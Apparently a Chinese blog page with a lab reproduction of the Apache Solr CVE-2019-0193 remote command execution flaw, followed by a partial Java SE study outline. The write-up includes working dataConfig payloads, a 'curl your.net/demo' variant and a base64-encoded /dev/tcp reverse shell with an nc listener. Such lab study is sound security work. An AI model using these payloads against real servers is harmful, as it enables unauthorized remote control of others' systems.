<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
    
  <meta name="description" content="阿巴阿巴QAQ" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     困困
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/images/cg.jpg" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  

<link rel="alternate" href="/atom.xml" title="困困" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/bj2.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">困困</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['我是一只小菜鸡呜呜呜~', '', ''],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  
<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content">a little vegetable chicken</div>
</div>


<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-二CVE-2019-0193：Apache-Solr远程命令执行漏洞复现"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
    >二CVE-2019-0193：Apache Solr远程命令执行漏洞复现</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2021-04-24T07:08:18.000Z" itemprop="datePublished">2021-04-24</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="0X00-漏洞概述"><a href="#0X00-漏洞概述" class="headerlink" title="0X00 漏洞概述"></a>0X00 漏洞概述</h1><p>​    2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，漏洞危害评级为严重。</p>
<p>​    此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
<h1 id="0X01-影响版本、利用条件"><a href="#0X01-影响版本、利用条件" class="headerlink" title="0X01 影响版本、利用条件"></a>0X01 影响版本、利用条件</h1><p>Apache solr &lt; 8.2.0</p>
<p>利用条件：</p>
<p>​    1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</p>
<p>​    2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证）</p>
<h1 id="0X02-环境搭建"><a href="#0X02-环境搭建" class="headerlink" title="0X02 环境搭建"></a>0X02 环境搭建</h1><ul>
<li>使用kali2020，装有docker的虚拟机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure>

<ul>
<li>进入进入漏洞目录使用docker-compose启动漏洞环境</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master&#x2F;solr&#x2F;CVE-2019-0193</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AE%89%E8%A3%85%E5%9B%BE2.png"></p>
<ul>
<li>在输入命令创建test核心</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AE%89%E8%A3%85%E5%9B%BE3.png"></p>
<ul>
<li>浏览器访问 http://靶机ip:8983，出现以下页面安装成功</li>
</ul>
<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/anz%E5%9B%BE4.png"></p>
<h1 id="0X03-漏洞分析"><a href="#0X03-漏洞分析" class="headerlink" title="0X03 漏洞分析"></a>0X03 漏洞分析</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="Dataimport"><a href="#Dataimport" class="headerlink" title="Dataimport"></a>Dataimport</h3><p>用于导入自定义数据，dataconfig需要满足一定语法，参考</p>
<ul>
<li>[<a href>https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a></li>
<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler">https://cwiki.apache.org/confluence/display/solr/DataImportHandler</a></li>
</ul>
<p>ScriptTransformer可以编写自定义脚本，例如Javascript、JRuby、Jython、Groovy和BeanShell</p>
<p>​    ScriptTransformer容许用脚本语言如Javascript、JRuby、Jython、Groovy和BeanShell转换，函数应当以行（类型为Map&lt;String,Object&gt;）为参数，可以修改字段。</p>
<p>​    脚本应当写在数据仓库配置文件顶级的script元素内，而转换器属性值为script:函数名。（<strong>换言之可以自己编写脚本，不过要加上<code>&lt;script&gt; &lt;/script&gt;</code> 元素标志头</strong>）</p>
<p>​    要写脚本必须满足以下条件：”脚本内容”写在数据库配置文件中的<code>&lt;script&gt;脚本内容&lt;/script&gt;</code>标签之内，并且每个函数都必须接受一个名为<code>row</code>的变量，该变量的数据类型为 <code>Map&lt;String,Object&gt;</code>(键名-键值 映射)，因为是Map类型的变量，所以它可以使用<code>get()</code>,<code>put()</code>,<code>remove()</code>,<code>clear()</code>等方法操作元素。</p>
<p>​    所以通过脚本可以实现各种操作：修改已存在的字段的值、添加新字段等。每个函数的返回值都返回的是”对象”。</p>
<p>​    该脚本将插入DIH配置文件中（脚本内容 在DIH配置文件中的第一行开始），并为每一个”行”(row)调用一次脚本，有多少”行”(row)就调用多少次脚本。</p>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataconfig&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 函数定义：  该脚本的作用是，获取<span class="string">&quot;华氏温度&quot;</span>（键名为temp_f）数值，计算出对应的<span class="string">&quot;摄氏温度&quot;</span>（键名为temp_c ）的值如<span class="number">99</span> ，插入键值对   <span class="string">&#x27;temp_c&#x27;</span>,<span class="number">99</span> 到这个名为row的<span class="built_in">Map</span>对象，retrun该对象  --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 函数定义：生成一个新的row的脚本 它的作用是获取到华氏温度temp_f  根据该数值计算出 摄氏温度temp_c 并生成一个新row --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2c</span>(<span class="params">row</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> tempf, tempc;</span><br><span class="line">      tempf = row.get(<span class="string">&#x27;temp_f&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (tempf != <span class="literal">null</span>) &#123;</span><br><span class="line">        tempc = (tempf - <span class="number">32.0</span>)*<span class="number">5.0</span>/<span class="number">9.0</span>;</span><br><span class="line">        row.put(<span class="string">&#x27;temp_c&#x27;</span>, temp_c);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> row;</span><br><span class="line">    &#125;</span><br><span class="line">    ]]&gt;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 函数调用：实体entity 中的属性transformer的值 为 函数名称（字符串 f2c ）,这样从外部数据源取到一条row，就会调用一次上面脚本中定义的名为f2c函数.  有多少条数据就调用多少次脚本中的函数 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;entity name=<span class="string">&quot;e1&quot;</span> pk=<span class="string">&quot;id&quot;</span> transformer=<span class="string">&quot;script:f2c&quot;</span> query=<span class="string">&quot;select * from X&quot;</span>&gt;</span><br><span class="line">      ....</span><br><span class="line">    &lt;/entity&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Nashorn引擎"><a href="#Nashorn引擎" class="headerlink" title="Nashorn引擎"></a>Nashorn引擎</h3><p>解析js脚本，可以通过Java.typeAPI在JavaScript中引用，就像Java的import一样（<strong>将文件包含在内</strong>）例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">&#x27;my.package.MyJavaClass&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">&quot;Nashorn&quot;</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure>

<h2 id="详细分析在以下文章"><a href="#详细分析在以下文章" class="headerlink" title="详细分析在以下文章"></a>详细分析在以下文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5965">https://xz.aliyun.com/t/5965</a></li>
</ul>
<h1 id="0X04-PoC"><a href="#0X04-PoC" class="headerlink" title="0X04 PoC"></a>0X04 PoC</h1><ul>
<li>进入DIH admin界面</li>
</ul>
<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/DIHadmin%E7%95%8C%E9%9D%A2.png"></p>
<p>构造PoC的注意点1：<code>debug=true</code></p>
<p>​    如图，DataImportHandler模块的DIH admin界面中有一个debug选项(本来是为了方便对”DIH配置”进行调试或开发)，勾选<code>Debug</code>，点击Execute，看到在HtTP请求中是<code>debug=true</code>，在PoC中必须带上它（为了回显结果）</p>
<p>构造PoC的注意点2：<strong>dataConfig信息</strong></p>
<p>​    注意：数据配置(dataconfig)中实体(entity)、字段(field)标签中有哪些属性取决于用了哪个处理器(processor)、哪个转换器(transformer)</p>
<p>​    dataConfig信息中的关键点（1）：这里我使用的数据源的类型是URLDataSource(理论上其他数据源的类型都可以)</p>
<p>​    dataConfig信息中的关键点（2）：既然有（1），所以<code>&lt;document&gt;</code>中的 <code>&lt;entity&gt;</code>实体标签里说明了该实体的属性。</p>
<ul>
<li><code>&lt;entity&gt;</code>实体的属性<ul>
<li>属性name 必填 用于标识实体的唯一名称</li>
<li>属性processor可选项 默认值为<code>SqlEntityProcessor</code>，所以当数据源不是RDBMS时必须填写该项。对于<code>URLDataSource</code>类型的数据源而言，它的值必须为“XPathEntityProcessor”(根据官方说明只能使用XPathEntityProcessor对‘URL的HTTP响应“做处理)；</li>
<li>属性transformer可选项 填写格式为<code>transformer=&quot;script:&lt;function-name&gt;&quot;</code> 指定了转换数据时具体的transformer(转换器)需要执行的脚本函数的名称(即字符串“poc“)；</li>
<li>属性forEach 必填 值为Xpath表达式 用于“划分“记录。如果有多种类型的记录就用<code>|</code>符号把这些表达式分隔开；</li>
<li>属性url的值用于调用REST API的URL(可以模板化)</li>
</ul>
</li>
</ul>
<p>​    dataConfig信息中的关键点（3）：<code>&lt;dataConfig&gt;</code>中的<code>&lt;script&gt;</code>标签中，写了名为”poc”的脚本函数的具体实现。</p>
<p><strong>PoC：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>); <span class="comment">//弹出计算器 &lt;script&gt;脚本内容&lt;/script&gt;</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;  </span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line">    &lt;entity name=<span class="string">&quot;stackoverflow&quot;</span></span><br><span class="line">            url=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span><br><span class="line">            processor=<span class="string">&quot;XPathEntityProcessor&quot;</span></span><br><span class="line">            forEach=<span class="string">&quot;/feed&quot;</span></span><br><span class="line">            transformer=<span class="string">&quot;script:poc&quot;</span> /&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>

<p>同一类型PoC：替换<code>&lt;script&gt;&lt;/script&gt;</code>内容即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">&quot;(java.lang.String[])&quot;</span>]([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl your.net/demo&quot;</span>]).start()</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="0X05-漏洞利用"><a href="#0X05-漏洞利用" class="headerlink" title="0X05 漏洞利用"></a>0X05 漏洞利用</h1><ul>
<li>创建成功后，访问<code>http://ip:8983</code>访问Apache solr的管理页面，选择<code>test</code>核心</li>
</ul>
<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A81.png"></p>
<ul>
<li>编写EXP，反弹shell，命令进行base64编码</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">192.168</span><span class="number">.171</span><span class="number">.133</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">编码后</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xMzMvMTIzNCAwPiYx</span><br></pre></td></tr></table></figure>

<p>将PoC的内容修改，为EXP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line">    &lt;entity name=<span class="string">&quot;stackoverflow&quot;</span></span><br><span class="line">            url=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span><br><span class="line">            processor=<span class="string">&quot;XPathEntityProcessor&quot;</span></span><br><span class="line">            forEach=<span class="string">&quot;/feed&quot;</span></span><br><span class="line">            transformer=<span class="string">&quot;script:poc&quot;</span> /&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>攻击机开启nc监听1234端口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%9B%91%E5%90%AC.png"></p>
<ul>
<li>开始攻击</li>
</ul>
<ol>
<li>访问Dataimport</li>
<li>勾选Debug</li>
<li>点击Debug Mode进入调试模式</li>
<li>使用EXP替换配置文件内容为(反弹shell到攻击机ip:端口)</li>
<li>执行</li>
</ol>
<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A82.png"></p>
<ul>
<li>成功反弹shell</li>
</ul>
<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BC%B9shell.png"></p>
<h1 id="0X06-修复建议"><a href="#0X06-修复建议" class="headerlink" title="0X06 修复建议"></a>0X06 修复建议</h1><p>​    Solr&gt;=8.2.0版安全。因为从Solr&gt;=8.2.0版开始，默认不可使用dataConfig参数，想使用此参数需要将Java System属性“enable.dih.dataConfigParam”设置为true。只有当Solr&gt;=8.2.0但是主动将Java System属性“enable.dih.dataConfigParam”设置为true，才存在漏洞。</p>
<h1 id="0X07-参考文章"><a href="#0X07-参考文章" class="headerlink" title="0X07 参考文章"></a>0X07 参考文章</h1><ul>
<li><p>[<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5965">https://xz.aliyun.com/t/5965</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/maxvchay/article/details/107017329">https://blog.csdn.net/maxvchay/article/details/107017329</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv9964152/">https://www.bilibili.com/read/cv9964152/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></p>
</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-0java-SE-大纲"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/21/Java-0java-SE-%E5%A4%A7%E7%BA%B2/"
    >Java 0java SE 大纲</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/21/Java-0java-SE-%E5%A4%A7%E7%BA%B2/" class="article-date">
  <time datetime="2021-04-21T12:33:41.000Z" itemprop="datePublished">2021-04-21</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="第一部分：基础知识"><a href="#第一部分：基础知识" class="headerlink" title="第一部分：基础知识"></a>第一部分：基础知识</h1><h1 id="第二部分-面向对象"><a href="#第二部分-面向对象" class="headerlink" title="第二部分:面向对象"></a>第二部分:面向对象</h1><h2 id="1-封装"><a href="#1-封装" class="headerlink" title="1.封装"></a>1.封装</h2><p>类</p>
<p>​    对一类事物抽象所得到的一个概念</p>
<p>对象</p>
<p>​    一个具体的事物构造函数</p>
<p>构造函数</p>
<ul>
<li>不能有返回值</li>
<li>方法名与类名相同</li>
<li>可以有多个</li>
<li>默认生成无参无方法体无返回值的构造函数，自己一旦定义,编译器将不再生成默认的构造函数生成一个类对象是能且只能调用其中的一个构适函数</li>
</ul>
<p>static</p>
<ul>
<li>凡是static修饰的成员都是静态成员，<strong>静态成员都是属于类的</strong></li>
<li>非静态的可以访问静态的</li>
<li>静态的不可以访问非静态的</li>
<li>通过类名只能访问一个类中的<strong>非私有静态成员</strong></li>
<li>私有静态成员也不可以通过对象名访问</li>
</ul>
<p>*<strong>类的方法只有一个，所有对象共用一个方法</strong></p>
<p>this</p>
<ul>
<li><p>非静态方法畎认都含有一个this指针</p>
</li>
<li><p>this代表正在调用本方法的对象</p>
</li>
</ul>
<p>final</p>
<ul>
<li><p>修饰类</p>
<ul>
<li>该类不能被继承</li>
</ul>
</li>
<li><p>修饰方法</p>
<ul>
<li>该方法可以被继承但不能被重写</li>
</ul>
</li>
<li><p>修饰属性</p>
<ul>
<li>表示该属性能且只能被赋一次值，赋值方式有两种，并且只能选择其中的一种来赋值<ul>
<li>1.定义的同时显示的初始化</li>
<li>2.构适函数中初始化</li>
</ul>
</li>
</ul>
</li>
<li><p>还可以修饰局部变量（用得少）</p>
</li>
</ul>
<h2 id="2-继承"><a href="#2-继承" class="headerlink" title="2.继承"></a>2.继承</h2><p>定义</p>
<p>​    子类继承了父类的成员</p>
<p>注意的问题：</p>
<p>​    非私有成员才可以被子类继承</p>
<p>​    重写：</p>
<p>​        重写方法必须和被重写方法具有相同的方法名称、参数列表、返回值类型</p>
<p>​        重写方法的访问权限不能小手被重写方法</p>
<h2 id="3-多态"><a href="#3-多态" class="headerlink" title="3.多态"></a>3.多态</h2><p>定义:</p>
<p>​    同一代码可以随上下文的不同而执行不同的操作，俗称多态</p>
<p>即：</p>
<p>​    一个父类的引用它既可以指向父类对象也可以指向子类对象</p>
<p>​    它可以根据当前时刻指向的不同，自动调用不向对象的方法</p>
<p>注意事项：</p>
<p>​    通过父类的引用只能访问子类从父类继承过来的成员</p>
<p>​    只有在父类的引用本身指向的就是一个子类对象时，我们才可以把父类的引用强制转化为子类的引用</p>
<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>一个抽象类通常都含有抽象方法</p>
<p>只重写了抽象类<strong>部分</strong>抽象方法的类也必须的被标记为abstract</p>
<p>不可以定义抽象类对象,但是抽象类可以卖现多态</p>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口中的方法都是<strong>public abstract</strong></p>
<p>不可以定义接口对象,但接口却可以实现多态</p>
<p>重写接口方法时public不能省</p>
<p>举例：</p>
<p>​    线程的创建</p>
<p>​    事件的处理</p>
<p>​    容器的组织方式</p>
<p>​    serializable接口</p>
<h1 id="第三部分：高级部分"><a href="#第三部分：高级部分" class="headerlink" title="第三部分：高级部分"></a>第三部分：高级部分</h1><h2 id="1-异常"><a href="#1-异常" class="headerlink" title="1.异常"></a>1.异常</h2><p>定义</p>
<p>​    运行时的错误</p>
<p>分类<br>    无法处理的错误</p>
<p>​    可以处理的异常</p>
<p>​    必须处理的异常</p>
<p>​            是Exception子类但不是Runt imeException的子类</p>
<p>​    可处理可不处理的异常</p>
<p>​            是RuntimeException的子类</p>
<p>注意问题：</p>
<p>​    <code>finally&#123;......&#125;</code>一定会执行</p>
<p>​    先捕获子类异常,在捕获父类异常,顺序不可颠倒</p>
<p>​    重写方法抛出异常的范围不能大于被重写方法抛出异常的范围</p>
<p>​    假设f方法抛出了A异常，则f方法有两种方式处理A异常</p>
<ol>
<li><code>throws A</code></li>
<li><code>try &#123;......&#125;catch() &#123;......&#125;</code></li>
</ol>
<h2 id="2-线程"><a href="#2-线程" class="headerlink" title="2.线程"></a>2.线程</h2><p>定义:</p>
<p>​    一个程序运行时的不同执行路径</p>
<p>创建线程的方式：</p>
<p>​    继承Thread类</p>
<p>​    实现Runnable接口（经常使用这个方法创建线程）</p>
<p>线程的同步</p>
<p>​    多个线程操作同一资源，并且要求这些操作中的若干个操作不能被中断,这时就需要考虑线程同步的问题</p>
<p>​    线程同步是通过<code>synchronized</code>来实现</p>
<p>​    <code>synchronized</code>可以修饰两种：</p>
<p>​        代码块</p>
<p>​        方法(默认锁定的是this)</p>
<p>​    示例：</p>
<p>​        买票</p>
<p>线程的通信</p>
<p>​    有时多个线程只有彼此相互协作才可以完成某个功能，这是就需要线程的通信</p>
<p>​    实现方式:</p>
<p>​        wai 和 notify / notifyA()</p>
<p>​    示例：</p>
<p>​        生产和消费</p>
<h2 id="3-包"><a href="#3-包" class="headerlink" title="3.包"></a>3.包</h2><p>包的生产与运行:</p>
<p>​    <code>package</code>语句必须是第一条语句</p>
<p>​    类名是包名和类名的组合</p>
<p>​    只有在整个包的最上层目录才可以运行</p>
<p>同包，不同包的相互访问（参考文章）</p>
<p>jar包的生成与jar包的使用</p>
<p>​    普通jar包的生成</p>
<p>​        <code>jar -cvf 要生成的jar包的名字.jar *</code> </p>
<p>​    可运行jar包的生成:</p>
<p>​        <code>jar-cvfm 要生成的jar包的名字.jar 1.txt *</code></p>
<h2 id="4-GUI"><a href="#4-GUI" class="headerlink" title="4.GUI"></a>4.GUI</h2><p>容器和组件的关系:</p>
